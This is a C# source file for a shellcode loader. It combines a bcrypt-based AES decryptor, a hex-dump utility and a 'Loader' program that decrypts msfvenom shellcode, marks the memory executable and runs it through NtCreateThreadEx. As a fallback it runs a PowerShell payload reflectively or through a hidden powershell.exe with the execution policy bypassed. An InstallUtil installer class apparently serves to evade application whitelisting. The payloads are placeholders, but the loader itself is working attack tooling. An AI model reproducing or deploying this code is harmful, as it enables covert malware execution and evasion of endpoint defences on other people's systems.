using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Linq;
using System.Text;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Net;
using System.Collections.Generic;
using System.Globalization;
using Utils.Hex;
using System.ComponentModel;

public static class AES_CBC
{
    // === Constants =======================================================
    private const uint BCRYPT_ALG_HANDLE_HMAC_FLAG = 0x00000008;
    private const uint BCRYPT_BLOCK_PADDING        = 0x00000001;
    private const string BCRYPT_SHA256             = "SHA256";
    private const string BCRYPT_AES                = "AES";
    private const string BCRYPT_CHAIN_MODE_CBC     = "ChainingModeCBC";
    private const int ITERATIONS                   = 10000;
    private const int KEY_LEN                      = 32;
    private const int IV_LEN                       = 16;
    private const int SALT_LEN                     = 8;
    private static readonly byte[] MAGIC_HEADER    = Encoding.ASCII.GetBytes("Salted__");

    // === Kernel32 ========================================================
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    private static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    // === bcrypt delegate definitions =====================================
    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    private delegate int BCryptOpenAlgorithmProviderDelegate(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    private delegate int BCryptGetPropertyDelegate(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    private delegate int BCryptSetPropertyDelegate(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, uint dwFlags);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    private delegate int BCryptCreateHashDelegate(IntPtr hAlgorithm, out IntPtr phHash, IntPtr pbHashObject, int cbHashObject, byte[] pbSecret, int cbSecret, uint dwFlags);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    private delegate int BCryptHashDataDelegate(IntPtr hHash, byte[] pbInput, int cbInput, uint dwFlags);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    private delegate int BCryptFinishHashDelegate(IntPtr hHash, byte[] pbOutput, int cbOutput, uint dwFlags);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    private delegate int BCryptDestroyHashDelegate(IntPtr hHash);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    private delegate int BCryptCloseAlgorithmProviderDelegate(IntPtr hAlgorithm, uint dwFlags);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    private delegate int BCryptGenerateSymmetricKeyDelegate(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, uint dwFlags);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    private delegate int BCryptEncryptDecryptDelegate(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    private delegate int BCryptDestroyKeyDelegate(IntPtr hKey);

    private static T Resolve<T>(string name) where T : class
    {
        IntPtr mod = LoadLibrary("bcrypt.dll");
        if (mod == IntPtr.Zero) throw new Exception("LoadLibrary failed for bcrypt.dll");
        IntPtr proc = GetProcAddress(mod, name);
        if (proc == IntPtr.Zero) throw new Exception("GetProcAddress failed for " + name);
        return Marshal.GetDelegateForFunctionPointer<T>(proc);
    }

    private static byte[] HmacSha256(byte[] key, byte[] data)
    {
        var openAlg    = Resolve<BCryptOpenAlgorithmProviderDelegate>("BCryptOpenAlgorithmProvider");
        var getProp    = Resolve<BCryptGetPropertyDelegate>("BCryptGetProperty");
        var createHash = Resolve<BCryptCreateHashDelegate>("BCryptCreateHash");
        var hashData   = Resolve<BCryptHashDataDelegate>("BCryptHashData");
        var finishHash = Resolve<BCryptFinishHashDelegate>("BCryptFinishHash");
        var destroyHash= Resolve<BCryptDestroyHashDelegate>("BCryptDestroyHash");
        var closeAlg   = Resolve<BCryptCloseAlgorithmProviderDelegate>("BCryptCloseAlgorithmProvider");

        // Open SHA‑256 provider in HMAC mode
        IntPtr hAlg;
        int status = openAlg(out hAlg, BCRYPT_SHA256, null, BCRYPT_ALG_HANDLE_HMAC_FLAG);
        if (status != 0) throw new Exception(string.Format("BCryptOpenAlgorithmProvider failed: 0x{0:X}", status));

        byte[] lenBuf = new byte[sizeof(int)];
        int     cbResult;
        status = getProp(hAlg, "HashDigestLength", lenBuf, lenBuf.Length, out cbResult, 0);
        if (status != 0) throw new Exception(string.Format("BCryptGetProperty failed: 0x{0:X}", status));
        int digestLen = BitConverter.ToInt32(lenBuf, 0);

        byte[] digest = new byte[digestLen];
        IntPtr hHash;
        status = createHash(hAlg, out hHash, IntPtr.Zero, 0, key, key.Length, 0);
        if (status != 0) throw new Exception(string.Format("BCryptCreateHash failed: 0x{0:X}", status));

        status = hashData(hHash, data, data.Length, 0);
        if (status != 0) throw new Exception(string.Format("BCryptHashData failed: 0x{0:X}", status));

        status = finishHash(hHash, digest, digest.Length, 0);
        if (status != 0) throw new Exception(string.Format("BCryptFinishHash failed: 0x{0:X}", status));

        destroyHash(hHash);
        closeAlg(hAlg, 0);

        return digest;
    }

    private static byte[] PBKDF2(byte[] password, byte[] salt, int iterations, int dkLen)
    {
        const int hLen = 32;
        int l = (int)Math.Ceiling((double)dkLen / hLen);
        byte[] dk = new byte[l * hLen];

        for (int i = 1; i <= l; i++)
        {
            byte[] ctr = BitConverter.GetBytes(IPAddress.HostToNetworkOrder(i));
            byte[] u = HmacSha256(password, salt.Concat(ctr).ToArray());
            byte[] t = (byte[])u.Clone();
            for (int j = 1; j < iterations; j++)
            {
                u = HmacSha256(password, u);
                for (int k = 0; k < hLen; k++) t[k] ^= u[k];
            }
            Buffer.BlockCopy(t, 0, dk, (i - 1) * hLen, hLen);
        }
        return dk.Take(dkLen).ToArray();
    }

    private static void DeriveKeyIv(string password, byte[] salt, out byte[] key, out byte[] iv)
    {
        byte[] pwdBytes = Encoding.UTF8.GetBytes(password);
        byte[] keyIv = PBKDF2(pwdBytes, salt, ITERATIONS, KEY_LEN + IV_LEN);
        key = keyIv.Take(KEY_LEN).ToArray();
        iv  = keyIv.Skip(KEY_LEN).Take(IV_LEN).ToArray();
    }

    public static string Encrypt(string plaintext, string password)
    {
        byte[] plainBytes = Encoding.UTF8.GetBytes(plaintext);

        byte[] salt = new byte[SALT_LEN];
        using (var rng = RandomNumberGenerator.Create())
        {
            rng.GetBytes(salt);
        }

        byte[] key, iv;
        DeriveKeyIv(password, salt, out key, out iv);


        var openAlg   = Resolve<BCryptOpenAlgorithmProviderDelegate>("BCryptOpenAlgorithmProvider");
        var setProp   = Resolve<BCryptSetPropertyDelegate>("BCryptSetProperty");
        var genKey    = Resolve<BCryptGenerateSymmetricKeyDelegate>("BCryptGenerateSymmetricKey");
        var encryptFn = Resolve<BCryptEncryptDecryptDelegate>("BCryptEncrypt");
        var destroyKey= Resolve<BCryptDestroyKeyDelegate>("BCryptDestroyKey");
        var closeAlg  = Resolve<BCryptCloseAlgorithmProviderDelegate>("BCryptCloseAlgorithmProvider");

        IntPtr hAlg;
        int status = openAlg(out hAlg, BCRYPT_AES, null, 0);
        if (status != 0) throw new Exception(string.Format("BCryptOpenAlgorithmProvider failed: 0x{0:X}", status));

        byte[] mode = Encoding.Unicode.GetBytes(BCRYPT_CHAIN_MODE_CBC + "\0");
        status = setProp(hAlg, "ChainingMode", mode, mode.Length, 0);
        if (status != 0) throw new Exception(string.Format("BCryptSetProperty failed: 0x{0:X}", status));

        IntPtr hKey;
        status = genKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
        if (status != 0) throw new Exception(string.Format("BCryptGenerateSymmetricKey failed: 0x{0:X}", status));

        int outLen;
        encryptFn(hKey, plainBytes, plainBytes.Length, IntPtr.Zero, iv, iv.Length, (byte[])null, 0, out outLen, BCRYPT_BLOCK_PADDING);


        byte[] cipher = new byte[outLen];
        status = encryptFn(hKey, plainBytes, plainBytes.Length, IntPtr.Zero, iv, iv.Length, cipher, cipher.Length, out outLen, BCRYPT_BLOCK_PADDING);
        if (status != 0) throw new Exception(string.Format("BCryptEncrypt failed: 0x{0:X}", status));

        destroyKey(hKey);
        closeAlg(hAlg, 0);

        byte[] output = new byte[MAGIC_HEADER.Length + SALT_LEN + outLen];
        Buffer.BlockCopy(MAGIC_HEADER, 0, output, 0, MAGIC_HEADER.Length);
        Buffer.BlockCopy(salt, 0, output, MAGIC_HEADER.Length, SALT_LEN);
        Buffer.BlockCopy(cipher, 0, output, MAGIC_HEADER.Length + SALT_LEN, outLen);

        return Convert.ToBase64String(output);
    }

    public static byte[] Decrypt(string base64, string password)
    {
        byte[] blob = Convert.FromBase64String(base64);
        if (!blob.Take(8).SequenceEqual(MAGIC_HEADER))
            throw new Exception("Invalid OpenSSL header");

        byte[] salt   = blob.Skip(8).Take(SALT_LEN).ToArray();
        byte[] cipher = blob.Skip(16).ToArray();

        byte[] key, iv;
        DeriveKeyIv(password, salt, out key, out iv);

        var openAlg    = Resolve<BCryptOpenAlgorithmProviderDelegate>("BCryptOpenAlgorithmProvider");
        var setProp    = Resolve<BCryptSetPropertyDelegate>("BCryptSetProperty");
        var genKey     = Resolve<BCryptGenerateSymmetricKeyDelegate>("BCryptGenerateSymmetricKey");
        var decryptFn  = Resolve<BCryptEncryptDecryptDelegate>("BCryptDecrypt");
        var destroyKey = Resolve<BCryptDestroyKeyDelegate>("BCryptDestroyKey");
        var closeAlg   = Resolve<BCryptCloseAlgorithmProviderDelegate>("BCryptCloseAlgorithmProvider");

        // Open AES provider
        IntPtr hAlg;
        int status = openAlg(out hAlg, BCRYPT_AES, null, 0);
        if (status != 0) throw new Exception(string.Format("BCryptOpenAlgorithmProvider failed: 0x{0:X}", status));

        // Force CBC
        byte[] mode = Encoding.Unicode.GetBytes(BCRYPT_CHAIN_MODE_CBC + "\0");
        status = setProp(hAlg, "ChainingMode", mode, mode.Length, 0);
        if (status != 0) throw new Exception(string.Format("BCryptSetProperty failed: 0x{0:X}", status));

        // Import key
        IntPtr hKey;
        status = genKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
        if (status != 0) throw new Exception(string.Format("BCryptGenerateSymmetricKey failed: 0x{0:X}", status));

        // required buffer size
        int outLen;
        decryptFn(hKey, cipher, cipher.Length, IntPtr.Zero, iv, iv.Length, (byte[])null, 0, out outLen, BCRYPT_BLOCK_PADDING);
        byte[] plain = new byte[outLen];
        status = decryptFn(hKey, cipher, cipher.Length, IntPtr.Zero, iv, iv.Length,
                           plain, plain.Length, out outLen, BCRYPT_BLOCK_PADDING);
        if (status != 0) throw new Exception(string.Format("BCryptDecrypt failed: 0x{0:X}", status));

        destroyKey(hKey);
        closeAlg(hAlg, 0);

        return plain.Take(outLen).ToArray();
    }
}


namespace Utils.Hex
{
    public static class Xxd
    {
        public static string Dump(byte[] data,
                                  int bytesPerLine = 16,
                                  bool showAscii = true,
                                  long startOffset = 0)
        {
            if (data == null) throw new ArgumentNullException("data");
            if (bytesPerLine <= 0 || bytesPerLine > 256)
                throw new ArgumentOutOfRangeException("bytesPerLine");

            var sb = new StringBuilder();
            int total = data.Length;
            int rows  = (total + bytesPerLine - 1) / bytesPerLine;

            for (int row = 0; row < rows; row++)
            {
                int rowStart = row * bytesPerLine;
                int rowLen   = Math.Min(bytesPerLine, total - rowStart);

                sb.AppendFormat("{0:x8}: ", startOffset + rowStart);
                for (int i = 0; i < bytesPerLine; i++)
                {
                    if (i < rowLen)
                        sb.AppendFormat("{0:x2}", data[rowStart + i]);
                    else
                        sb.Append("  ");

                    if ((i & 1) == 1) sb.Append(' ');
                }
                if (showAscii)
                {
                    sb.Append(' ');
                    for (int i = 0; i < rowLen; i++)
                    {
                        byte b = data[rowStart + i];
                        sb.Append((b >= 32 && b <= 126) ? (char)b : '.');
                    }
                }

                sb.AppendLine();
            }
            return sb.ToString();
        }
        public static byte[] Reverse(string dump)
        {
            if (dump == null) throw new ArgumentNullException("dump");

            var bytes = new List<byte>();
            string[] lines = dump.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);

            foreach (string line in lines)
            {
                int colon = line.IndexOf(':');
                if (colon < 0 || colon + 2 >= line.Length) continue;

                string hexPart = line.Substring(colon + 1);
                int asciiIdx = hexPart.IndexOf("  ");
                if (asciiIdx >= 0) hexPart = hexPart.Substring(0, asciiIdx);

                for (int i = 0; i < hexPart.Length; )
                {
                    if (hexPart[i] == ' ')
                    {
                        i++;
                        continue;
                    }
                    if (i + 1 >= hexPart.Length) break;

                    string pair = hexPart.Substring(i, 2);
                    byte val;
                    if (byte.TryParse(pair, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out val))
                        bytes.Add(val);

                    i += 2;
                }
            }
            return bytes.ToArray();
        }

        public static string DumpFile(string path,
                                      int bytesPerLine = 16,
                                      bool showAscii   = true)
        {
            return Dump(File.ReadAllBytes(path), bytesPerLine, showAscii, 0);
        }

        public static void ReverseToFile(string dump, string outputPath)
        {
            File.WriteAllBytes(outputPath, Reverse(dump));
        }
    }
}
namespace Loader
{
    
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint   dwSize,
            uint   flAllocationType,
            uint   flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateThread(
            IntPtr  lpThreadAttributes,
            uint    dwStackSize,
            IntPtr  lpStartAddress,
            IntPtr  lpParameter,
            uint    dwCreationFlags,
            out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint   dwMilliseconds);


        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtCreateThreadEx(
            out IntPtr threadHandle,
            uint desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            uint stackZeroBits,
            uint sizeOfStackCommit,
            uint sizeOfStackReserve,
            IntPtr bytesBuffer
        );
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect
        );

        static void Main(string[] argv)
        {
            go(argv);
        }
        public static void go(string[] argv)
        {
            Exploit();

        }

        static bool TryReflectivePowershell(string script)
        {
            try
            {
                string smaPath = FindSmaDll();
                if (smaPath == null) { Console.WriteLine("[!] SMA DLL not found"); return false; }
                Console.WriteLine("> SMA DLL path: " + smaPath);
                byte[] smaBytes = File.ReadAllBytes(smaPath);
                var smaAsm = Assembly.Load(smaBytes);
                var psType = smaAsm.GetType("System.Management.Automation.PowerShell");
                if (psType == null) { Console.WriteLine("[!] Could not get PowerShell type"); return false; }
                object psObj = psType.GetMethod("Create", Type.EmptyTypes).Invoke(null, null);
                if (psObj == null) { Console.WriteLine("[!] Failed to create PowerShell instance"); return false; }
                var addScriptMethod = psType.GetMethod("AddScript", new Type[] { typeof(string) });
                if (addScriptMethod == null) { Console.WriteLine("[!] AddScript not found"); return false; }
                addScriptMethod.Invoke(psObj, new object[] { script });
                var invokeMethod = psType.GetMethod("Invoke", Type.EmptyTypes);
                if (invokeMethod == null) { Console.WriteLine("[!] Invoke not found"); return false; }
                var results = invokeMethod.Invoke(psObj, null) as System.Collections.IEnumerable;
                if (results != null)
                {
                    foreach (var r in results)
                        Console.WriteLine("[PS] " + r);
                }
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Reflective PS error: " + ex.Message);
                return false;
            }
        }
        static void view_hexdump(IntPtr addr, byte[] shellcode)
        {
            Console.WriteLine("view_hexdump:");
            byte[] view = new byte[shellcode.Length];
            Marshal.Copy(addr, view, 0, view.Length);
            Console.WriteLine(Xxd.Dump(view));
        }
        static void Exploit()
        {
            const string password = "REPLACE_WITH_MSFVENOM_PASSWORD";
            string encryptedData = "";
            
            switch (RuntimeInformation.ProcessArchitecture)
            {
                case Architecture.X86:
                    encryptedData = "REPLACE_WITH_x86_MSFVENOM_OUTPUT";
                    Console.WriteLine("Process architecture: X86");
                    break;

                case Architecture.X64:
                    encryptedData = "REPLACE_WITH_x64_MSFVENOM_OUTPUT";
                    Console.WriteLine("Process architecture: X64");
                    break;

                case Architecture.Arm:
                    Console.WriteLine("Process architecture: ARM");
                    break;

                case Architecture.Arm64:
                    Console.WriteLine("Process architecture: ARM64");
                    break;

                default:
                    Console.WriteLine("Unknown architecture: " + RuntimeInformation.ProcessArchitecture);
                    break;
            }

            // encryptedData = "";
            if (encryptedData == ""){
                string script = "REPLACE_WITH_POWERSHELL_PAYLOAD";
                if (TryReflectivePowershell(script)) return;
                Console.WriteLine("[!] Reflective PowerShell failed, trying external powershell.exe fallback");
                string psPath = FindPowershellExe();
                if (psPath == null) { Console.WriteLine("[!] powershell.exe not found"); return; }
                Console.WriteLine("> Using powershell.exe at: " + psPath);
                var psi = new ProcessStartInfo
                {
                    FileName = psPath,
                    Arguments = "-executionpolicy bypass -windowstyle hidden -noninteractive -nologo -e \"" + script + "\"",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };
                var proc = Process.Start(psi);
                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();
                proc.WaitForExit();
                Console.WriteLine("[>] Output: " + output);
                Console.WriteLine("[>] Error: " + error);
            }
            
            // 1. Decrypt shellcode
            byte[] shellcode = AES_CBC.Decrypt(encryptedData, password);

            // 2. Allocate RW memory
            const uint MEM_COMMIT = 0x1000;
            const uint MEM_RESERVE = 0x2000;
            const uint PAGE_READWRITE = 0x04;
            const uint PAGE_EXECUTE_READ = 0x20;

            IntPtr addr = VirtualAlloc(
                IntPtr.Zero,
                (uint)shellcode.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE);

            if (addr == IntPtr.Zero)
                throw new Win32Exception(Marshal.GetLastWin32Error(), "VirtualAlloc failed");

            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            uint oldProtect;
            bool vp = VirtualProtect(
                addr,
                (UIntPtr)shellcode.Length,
                PAGE_EXECUTE_READ,
                out oldProtect);


            byte[] view = new byte[shellcode.Length];
            Marshal.Copy(addr, view, 0, view.Length);
            Console.WriteLine("view_hexdump:");
            Console.WriteLine(Xxd.Dump(view));

            try
            {
                IntPtr hThread;
                uint ntStatus = NtCreateThreadEx(
                    out hThread,
                    0x1FFFFF,
                    IntPtr.Zero,
                    Process.GetCurrentProcess().Handle,
                    addr,
                    IntPtr.Zero,
                    false,
                    0, 0, 0, IntPtr.Zero);

                if (ntStatus != 0 || hThread == IntPtr.Zero)
                    throw new Win32Exception(Marshal.GetLastWin32Error(), "NtCreateThreadEx failed (NTSTATUS=0x{ntStatus:X})");

                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Shellcode execution failed: " + ex.Message);
            }


        }

        private static string FindPowershellExe()
        {
            string winDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            string ps64 = Path.Combine(winDir, "System32", "WindowsPowerShell", "v1.0", "powershell.exe");
            string ps32 = Path.Combine(winDir, "SysWOW64", "WindowsPowerShell", "v1.0", "powershell.exe");
            if (File.Exists(ps64)) return ps64;
            if (File.Exists(ps32)) return ps32;
            return null;
        }

        private static string FindSmaDll()
        {
            string winDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            string[] paths = new string[] {
                Path.Combine("C:", "System32", "WindowsPowerShell", "v1.0", "System.Management.Automation.dll"),
                Path.Combine("C:", "SysWOW64", "WindowsPowerShell", "v1.0", "System.Management.Automation.dll")
            };
            foreach (string path in paths)
                if (File.Exists(path)) return path;
            return null;
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);
            
        }
    }
}
